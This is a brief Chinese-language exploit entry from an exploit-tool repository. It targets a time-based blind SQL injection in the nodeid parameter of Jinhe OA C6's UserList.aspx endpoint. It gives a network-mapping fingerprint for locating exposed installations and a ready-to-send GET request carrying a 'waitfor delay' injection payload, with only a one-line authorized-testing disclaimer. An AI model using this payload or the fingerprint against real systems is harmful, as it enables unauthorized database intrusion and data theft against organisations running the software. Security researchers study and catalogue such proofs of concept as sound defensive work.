---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA UserList.aspx SQL注入漏洞

## 漏洞描述

金和OA C6 `/c6/JHSoft.Web.Users/UserList.aspx/` 接口 `nodeid` 参数存在 SQL 注入漏洞（延时盲注）。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /c6/JHSoft.Web.Users/UserList.aspx/?nodeid=1007%27%3Bwaitfor/**/+delay/**/+%270%3A0%3A3%27-- HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
